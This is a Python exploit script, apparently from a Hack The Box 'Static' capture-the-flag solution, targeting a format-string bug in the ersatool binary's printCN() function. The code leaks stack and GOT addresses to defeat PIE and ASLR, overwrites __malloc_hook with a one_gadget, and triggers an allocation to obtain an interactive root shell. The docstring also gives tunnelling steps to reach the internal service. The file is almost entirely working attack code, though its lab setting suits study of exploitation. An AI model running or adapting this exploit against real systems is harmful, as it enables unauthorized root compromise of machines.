#!/usr/bin/env python3
"""Static (HTB) - ersatool printCN() format string -> root.

Source write-up: static.txt

Leak main() with %51$lp, derive the PIE base (page aligned, ends 000),
leak printf() through the GOT with %9$s, derive the libc base, overwrite
__malloc_hook with one_gadget 0x4f322, then force an allocation with %10000$c.

The binary runs with capabilities on the internal host, so the shell is root.
Reach the internal service first (e.g. socat relay / SSH tunnel) and expose it
locally on 127.0.0.1:1234.

Usage:
    python3 poc_ertool_fmt.py ./ersatool ./libc.so.6 [host] [port]
"""
import sys

from pwn import ELF, context, fmtstr_payload, p64, remote, u64

OFFSET = 8
MAIN_LEAK_POS = 51


def main():
    binary = sys.argv[1] if len(sys.argv) > 1 else "./ersatool"
    libc_path = sys.argv[2] if len(sys.argv) > 2 else "./libc.so.6"
    host = sys.argv[3] if len(sys.argv) > 3 else "127.0.0.1"
    port = int(sys.argv[4]) if len(sys.argv) > 4 else 1234

    context.binary = elf = ELF(binary, checksec=False)
    libc = ELF(libc_path, checksec=False)
    p = remote(host, port)

    # 1) PIE base from a leaked return address on the stack
    p.sendlineafter(b"print->CN=", f"%{MAIN_LEAK_POS}$lp".encode())
    line = p.recvline()
    main_addr = int(line.split()[0], 16)
    elf.address = main_addr - elf.symbols.main
    if elf.address & 0xFFF:
        print(f"[!] base not page aligned: {elf.address:#x}")
    print(f"[+] main={main_addr:#x} base={elf.address:#x}")

    # 2) libc base from printf@GOT
    leak = b"%9$s".ljust(8, b"\0") + p64(elf.got.printf)
    p.sendlineafter(b"print->CN=", leak)
    data = p.recvline()
    data = data[: data.index(b"[!] ERR")]
    printf_addr = u64(data.ljust(8, b"\0"))
    libc.address = printf_addr - libc.symbols.printf
    print(f"[+] printf={printf_addr:#x} libc={libc.address:#x}")

    # 3) __malloc_hook -> one_gadget
    one_gadget = libc.address + 0x4F322
    payload = fmtstr_payload(
        OFFSET, {libc.sym.__malloc_hook: one_gadget}, write_size="short"
    )
    p.sendlineafter(b"print->CN=", payload)
    p.recv()

    # 4) allocate -> hook fires
    p.sendlineafter(b"print->CN=", b"%10000$c")
    p.interactive()


if __name__ == "__main__":
    main()
